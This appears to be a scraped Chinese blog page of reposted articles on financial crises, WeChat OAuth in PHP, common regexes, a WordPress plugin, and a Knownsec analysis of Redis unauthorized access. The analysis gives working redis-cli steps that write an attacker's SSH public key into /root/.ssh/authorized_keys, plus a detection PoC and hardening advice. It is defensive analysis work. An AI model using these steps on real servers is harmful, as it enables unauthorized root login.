621.80点，跌破9000点大关。面对国际金融炒家的猛烈进攻，香港特区政府重申不会改变现行汇率制度，恒生指数上扬，再上万点大关。<br>　　接着，11月中旬，东亚的韩国也爆发金融风暴，17日，韩元对美元的汇率跌至创纪录的1008∶1.21日，韩国政府不得不向国际货币基金组织求援，暂时控制了危机。但到了12月13日，韩元对美元的汇率又降至1737.60∶1.<br>　　韩元危机也冲击了在韩国有大量投资的日本金融业。1997年下半年日本的一系列银行和证券公司相继破产。东南亚金融风暴演变为亚洲金融危机。<br>　　东南亚金融危机使得与之关系密切的日本经济陷入困境。日元汇率从1997年6月底的115日元兑1美元跌至1998年4月初的133日元兑1美元；5、6月间，日元汇率一路下跌，一度接近150日元兑1美元的关口。随着日元的大幅贬值，国际金融形势更加不明朗，亚洲金融危机继续深化。这场危机一直持续到1999年才结束。<br><a href="/uploads/2015/12/178587961.jpg"><img src="/uploads/2015/12/178587961.jpg" alt="178587961"></a><br><strong>九、2007年至2011年：美国次贷危机及全球金融危机</strong><br>　　美国次贷危机(subprime crisis)又称次级房贷危机，也译为次债危机。它是指一场发生在美国，因次级抵押贷款机构破产、投资基金被迫关闭、股市剧烈震荡引起的金融风暴。<br>　　美国“次贷危机”是从2006年(丙戌年)春季开始逐步显现的。在2006年之前的5年里，由于美国住房市场持续繁荣，加上前几年美国利率水平较低，美国的次级抵押贷款市场迅速发展。随着美国住房市场的降温尤其是短期利率的提高，次贷还款利率也大幅上升，购房者的还贷负担大为加重。同时，住房市场的持续降温也使购房者出售住房或者通过抵押住房再融资变得困难。<br>　　这种局面直接导致大批次贷的借款人不能按期偿还贷款，银行收回房屋，却卖不到高价，大面积亏损，引发了次贷危机。<br>　　2007年8月次贷危机席卷美国、欧盟和日本等世界主要金融市场。这场危机导致过度投资次贷金融衍生品的公司和机构纷纷倒闭，并在全球范围引发了严重的信贷紧缩。<br>　　美国次贷危机最终引发了波及全球的金融危机。2008年9月，雷曼兄弟破产和美林公司被收购标志着金融危机的全面爆发。随着虚拟经济的灾难向实体经济扩散，世界各国经济增速放缓，失业率激增，一些国家开始出现严重的经济衰退。<br>　　2011年1月10日，国际清算银行在巴塞尔召开成员央行行长双月例会及全球经济会议，分析全球经济形势。全球经济会议主席欧洲央行行长特里谢表示，世界经济已走出危机阴影，全球经济复苏已经确立。</p>
<p>转载自 <a href="http://money.hexun.com/2015-08-25/178587939.html" target="_blank" rel="noopener">http://money.hexun.com/2015-08-25/178587939.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/杂七杂八/">杂七杂八</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/12/02/历史上的金融危机都是怎么发生的/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/23/微信公众平台OAuth2.0网页授权php示例/"><span>微信公众平台OAuth2.0网页授权php示例</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/23/微信公众平台OAuth2.0网页授权php示例/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-22T22:51:43.000Z">
          2015-11-23
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>1、配置授权回调页面域名，如 <a href="http://www.aaa.com" target="_blank" rel="noopener">www.aaa.com</a></p>
<p>2、模拟公众号的第三方网页，fn_system.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        header(<span class="string">"Location:http://www.aaa.com/uc/fn_wx_login.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r($_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>3、访问第三方网页时，如果检查session中不存在会话信息，则跳转至登陆页，fn_wx_login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $appid = <span class="string">"公众号在微信的appid"</span>;</span><br><span class="line">    $url = <span class="string">'https://open.weixin.qq.com/connect/oauth2/authorize?appid='</span>.$appid.<span class="string">'&amp;redirect_uri=http%3a%2f%2fwww.aaa.com%2fuc%2ffn_callback.php&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=STATE#wechat_redirect'</span>;</span><br><span class="line">    header(<span class="string">"Location:"</span>.$url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>4、在登陆页组装appid，回跳url等信息，然后跳转至微信的用户授权页。</p>
<p>5、在微信的用户授权页，如果用户选择了“同意授权”，则微信重新回跳至第三方网页的回跳地址时，会附带上code参数。</p>
<p>6、第三方网页的回跳url中，首先从请求中取得code，然后根据code进一步换取openid和access_token，然后就可以根据openid和access_token调用微信的相关接口查询用户信息了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $appid = <span class="string">"公众号在微信的appid"</span>;</span><br><span class="line">    $secret = <span class="string">"公众号在微信的app secret"</span>;</span><br><span class="line">    $code = $_GET[<span class="string">"code"</span>];</span><br><span class="line">    $get_token_url = <span class="string">'https://api.weixin.qq.com/sns/oauth2/access_token?appid='</span>.$appid.<span class="string">'&amp;secret='</span>.$secret.<span class="string">'&amp;code='</span>.$code.<span class="string">'&amp;grant_type=authorization_code'</span>;</span><br><span class="line"></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch,CURLOPT_URL,$get_token_url);</span><br><span class="line">    curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span> );</span><br><span class="line">    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, <span class="number">10</span>);</span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    $json_obj = json_decode($res,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据openid和access_token查询用户信息</span></span><br><span class="line">    $access_token = $json_obj[<span class="string">'access_token'</span>];</span><br><span class="line">    $openid = $json_obj[<span class="string">'openid'</span>];</span><br><span class="line">    $get_user_info_url = <span class="string">'https://api.weixin.qq.com/sns/userinfo?access_token='</span>.$access_token.<span class="string">'&amp;openid='</span>.$openid.<span class="string">'&amp;lang=zh_CN'</span>;</span><br><span class="line"></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch,CURLOPT_URL,$get_user_info_url);</span><br><span class="line">    curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span> );</span><br><span class="line">    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, <span class="number">10</span>);</span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析json</span></span><br><span class="line">    $user_obj = json_decode($res,<span class="keyword">true</span>);</span><br><span class="line">    $_SESSION[<span class="string">'user'</span>] = $user_obj;</span><br><span class="line">    print_r($user_obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>转载自 <a href="http://huangqiqing123.iteye.com/blog/2005770" target="_blank" rel="noopener">http://huangqiqing123.iteye.com/blog/2005770</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/23/微信公众平台OAuth2.0网页授权php示例/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/22/常用正则表达式/"><span>常用正则表达式</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/22/常用正则表达式/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-22T06:31:29.000Z">
          2015-11-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>说明：正则表达式通常用于两种任务：1.验证，2.搜索/替换。用于验证时，通常需要在前后分别加上^和$，以匹配整个待验证字符串；搜索/替换时是否加上此限定则根据搜索的要求而定，此外，也有可能要在前后加上\b而不是^和$。此表所列的常用正则表达式，除个别外均未在前后加上任何限定，请根据需要，自行处理。</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>正则表达式</th>
</tr>
</thead>
<tbody>
<tr>
<td>网址（URL）</td>
<td>[a-zA-z]+://[^\s]*</td>
</tr>
<tr>
<td>IP地址(IP Address)</td>
<td>((2[0-4]\d&#124;25[0-5]&#124;[01]?\d\d?).){3}(2[0-4]\d&#124;25[0-5]&#124;[01]?\d\d?)</td>
</tr>
<tr>
<td>电子邮件(Email)</td>
<td>\w+([-+.]\w+)<em>@\w+([-.]\w+)</em>.\w+([-.]\w+)*</td>
</tr>
<tr>
<td>QQ号码</td>
<td>[1-9]\d{4,}</td>
</tr>
<tr>
<td>HTML标记(包含内容或自闭合)</td>
<td>&lt;(.<em>)(.</em>)&gt;.<em>&lt;\/\1&gt;&#124;&lt;(.</em>) \/&gt;</td>
</tr>
<tr>
<td>密码(由数字/大写字母/小写字母/标点符号组成，四种都必有，8位以上)</td>
<td>(?=^.{8,}$)(?=.<em>\d)(?=.</em>\W+)(?=.<em>[A-Z])(?=.</em>[a-z])(?!.<em>\n).</em>$</td>
</tr>
<tr>
<td>日期(年-月-日)</td>
<td>(\d{4}&#124;\d{2})-((1[0-2])&#124;(0?[1-9]))-(([12][0-9])&#124;(3[01])&#124;(0?[1-9]))</td>
</tr>
<tr>
<td>日期(月/日/年)</td>
<td>((1[0-2])&#124;(0?[1-9]))/(([12][0-9])&#124;(3[01])&#124;(0?[1-9]))/(\d{4}&#124;\d{2})</td>
</tr>
<tr>
<td>时间(小时:分钟, 24小时制)</td>
<td>((1&#124;0?)[0-9]&#124;2[0-3]):([0-5][0-9])</td>
</tr>
<tr>
<td>汉字(字符)</td>
<td>[\u4e00-\u9fa5]</td>
</tr>
<tr>
<td>中文及全角标点符号(字符)</td>
<td>[\u3000-\u301e\ufe10-\ufe19\ufe30-\ufe44\ufe50-\ufe6b\uff01-\uffee]</td>
</tr>
<tr>
<td>中国大陆固定电话号码</td>
<td>(\d{4}-&#124;\d{3}-)?(\d{8}&#124;\d{7})</td>
</tr>
<tr>
<td>中国大陆手机号码</td>
<td>1\d{10}</td>
</tr>
<tr>
<td>中国大陆邮政编码</td>
<td>[1-9]\d{5}</td>
</tr>
<tr>
<td>中国大陆身份证号(15位或18位)</td>
<td>\d{15}(\d\d[0-9xX])?</td>
</tr>
<tr>
<td>非负整数(正整数或零)</td>
<td>\d+</td>
</tr>
<tr>
<td>正整数</td>
<td>[0-9]<em>[1-9][0-9]</em></td>
</tr>
<tr>
<td>负整数</td>
<td>-[0-9]<em>[1-9][0-9]</em></td>
</tr>
<tr>
<td>整数</td>
<td>-?\d+</td>
</tr>
<tr>
<td>小数</td>
<td>(-?\d+)(.\d+)?</td>
</tr>
<tr>
<td>不包含abc的单词</td>
<td>\b((?!abc)\w)+\b</td>
</tr>
</tbody>
</table>
<p>转载自 <a href="http://deerchao.net/tutorials/regex/common.htm" target="_blank" rel="noopener">http://deerchao.net/tutorials/regex/common.htm</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/22/常用正则表达式/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/"><span>Redis 未授权访问配合 SSH key 文件利用分析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-11T22:00:55.000Z">
          2015-11-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>Redis 未授权访问的问题是一直存在的问题，知道创宇安全研究团队历史上也做过相关的应急，今日，又出现 Redis 未授权访问配合 SSH key 文件被利用的情况，今天我们来简要的分析下。</p>
<p><strong>一、漏洞概述</strong><br>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>
<p><strong>1、漏洞描述</strong><br>Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。<br>为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。<br>利 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p>
<p><strong>2、漏洞影响</strong><br>Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。<br>通过ZoomEye 的搜索结果显示，有97707在公网可以直接访问的Redis服务。<br><a href="/uploads/2015/11/QQ20151111-0@2x.png"><img src="/uploads/2015/11/QQ20151111-0@2x.png" alt="QQ20151111-0@2x"></a><br>根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下：<br><a href="/uploads/2015/11/1副本.png"><img src="/uploads/2015/11/1副本.png" alt="1副本"></a><br>全球无验证可直接利用Redis TOP 10国家与地区：<br><a href="/uploads/2015/11/2副本.png"><img src="/uploads/2015/11/2副本.png" alt="2副本"></a></p>
<p><strong>3、漏洞分析与利用</strong><br>首先在本地生产公私钥文件：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>ssh-keygen –t rsa</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/11/ssh-keygen.png"><img src="/uploads/2015/11/ssh-keygen.png" alt="ssh-keygen"></a><br>然后将公钥写入 foo.txt 文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt</span><br></pre></td></tr></table></figure></p>
<p>再连接 Redis 写入文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit</span><br><span class="line"><span class="meta">$</span> redis-cli -h 192.168.1.11</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config get dir</span><br><span class="line">1) "dir"</span><br><span class="line">2) "/root/.ssh"</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config set dbfilename "authorized_keys"</span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/11/redis_ssh.png"><img src="/uploads/2015/11/redis_ssh.png" alt="redis_ssh"></a><br>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ssh –i  id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure></p>
<p>即可远程利用自己的私钥登录该服务器。<br>当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</p>
<p><strong>4、Redis 未授权的其他危害与利用</strong><br><strong>a）数据库数据泄露</strong><br>Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。<br><a href="/uploads/2015/11/redis_user.png"><img src="/uploads/2015/11/redis_user.png" alt="redis_user"></a></p>
<p><strong>b）代码执行</strong><br>Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下<br>一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的.<br><a href="/uploads/2015/11/redis_lua.png"><img src="/uploads/2015/11/redis_lua.png" alt="redis_lua"></a><br>通过<a href="https://github.com/evilpacket/redis-sha-crack" target="_blank" rel="noopener">Lua代码</a>(<a href="/uploads/2015/11/redis-sha-crack-master.zip">redis-sha-crack-master</a>)攻击者可以调用 redis.sha1hex() 函数，恶意利用 Redis 服务器进行 SHA-1 的破解。</p>
<p><strong>c）敏感信息泄露</strong><br>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。<br><a href="/uploads/2015/11/redis_info.png"><img src="/uploads/2015/11/redis_info.png" alt="redis_info"></a><br>可以看到泄露了很多 Redis 服务器的信息, 有当前 Redis 版本, 内存运行状态, 服务端个数等等敏感信息。</p>
<p><strong>5、漏洞验证</strong><br>可以使用Pocsuite（<a href="http://github.com/knownsec/pocsuite" target="_blank" rel="noopener">http://github.com/knownsec/pocsuite</a>）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。<br>[python]#!/usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>import socket<br>import urlparse<br>from pocsuite.poc import POCBase, Output<br>from pocsuite.utils import register</p>
<p>class TestPOC(POCBase):<br>    vulID = ‘89339’<br>    version = ‘1’<br>    author = [‘Anonymous’]<br>    vulDate = ‘2015-10-26’<br>    createDate = ‘2015-10-26’<br>    updateDate = ‘2015-10-26’<br>    references = [‘<a href="http://sebug.net/vuldb/ssvid-89339&#39;]" target="_blank" rel="noopener">http://sebug.net/vuldb/ssvid-89339&#39;]</a><br>    name = ‘Redis 未授权访问 PoC’<br>    appPowerLink = ‘<a href="http://redis.io/&#39;" target="_blank" rel="noopener">http://redis.io/&#39;</a><br>    appName = ‘Redis’<br>    appVersion = ‘All’<br>    vulType = ‘Unauthorized access’<br>    desc = ‘’’<br>        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。<br>    ‘’’<br>    samples = [‘’]</p>
<pre><code>def _verify(self):
    result = {}
    payload = &apos;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&apos;
    s = socket.socket()
    socket.setdefaulttimeout(10)
    try:
        host = urlparse.urlparse(self.url).netloc
        port = 6379
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        if recvdata and &apos;redis_version&apos; in recvdata:
            result[&apos;VerifyInfo&apos;] = {}
            result[&apos;VerifyInfo&apos;][&apos;URL&apos;] = self.url
            result[&apos;VerifyInfo&apos;][&apos;Port&apos;] = port
    except:
        pass
    s.close()
    return self.parse_attack(result)

def _attack(self):
    return self._verify()

def parse_attack(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail(&apos;Internet nothing returned&apos;)
    return output
</code></pre><p>register(TestPOC)[/python]</p>
<p><strong>二、安全建议</strong><br>配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379<br>配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中<br>配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度<br>好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config</p>
<p><strong>三、参考链接</strong></p>
<ul>
<li><a href="http://www.sebug.net/vuldb/ssvid-89339" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89339</a></li>
</ul>
<ul>
<li><a href="http://antirez.com/news/96" target="_blank" rel="noopener">http://antirez.com/news/96</a></li>
</ul>
<ul>
<li><a href="http://www.secpulse.com/archives/5366.html" target="_blank" rel="noopener">http://www.secpulse.com/archives/5366.html</a></li>
</ul>
<ul>
<li><a href="http://www.sebug.net/vuldb/ssvid-89715" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89715</a></li>
</ul>
<p>转载自 <a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/04/发布个金十数据插件/"><span>发布个金十数据插件</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/04/发布个金十数据插件/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-04T07:05:34.000Z">
          2015-11-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>好久没像现在这样正式的发布一个东西了，作为我 WordPress 插件的处女作，正好财经类的东西也没多少人做，我很严肃的想了想正好可以填补这个空白。。。嗯废话少说上截图:<br><a href="/uploads/2015/11/Screenshot_2015-11-04-22-50-35.png"><img src="/uploads/2015/11/Screenshot_2015-11-04-22-50-35.png" alt="Screenshot_2015-11-04-22-50-35"></a><br>本插件以小工具形式显示，您可以到外观–&gt;小工具下配置。<br>服务端的为 node.js 编写，<a href="https://github.com/jshensh/auagprice" target="_blank" rel="noopener">https://github.com/jshensh/auagprice</a><br>插件不单独发布源码，请访问 <a href="https://wordpress.org/plugins/jin10" target="_blank" rel="noopener">https://wordpress.org/plugins/jin10</a> 或者后台搜索 jin10 安装插件：<br><a href="/uploads/2015/11/QQ图片20151126001439.png"><img src="/uploads/2015/11/QQ图片20151126001439.png" alt="QQ图片20151126001439"></a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/程序发布/">程序发布</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/04/发布个金十数据插件/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/04/WordPress 插件开发实例 – 详细注释的 Widget 开发例子/"><span>WordPress 插件开发实例 – 详细注释的 Widget 开发例子</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/04/WordPress 插件开发实例 – 详细注释的 Widget 开发例子/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-04T02:24:27.000Z">
          2015-11-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在 wp-content\plugins 下创建 example-widget.php 代码如下 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Plugin Name: Example Widget</span></span><br><span class="line"><span class="comment"> * Plugin URI: http://example.com/widget</span></span><br><span class="line"><span class="comment"> * Description: A widget that serves as an example for developing more advanced widgets.</span></span><br><span class="line"><span class="comment"> * Version: 0.1</span></span><br><span class="line"><span class="comment"> 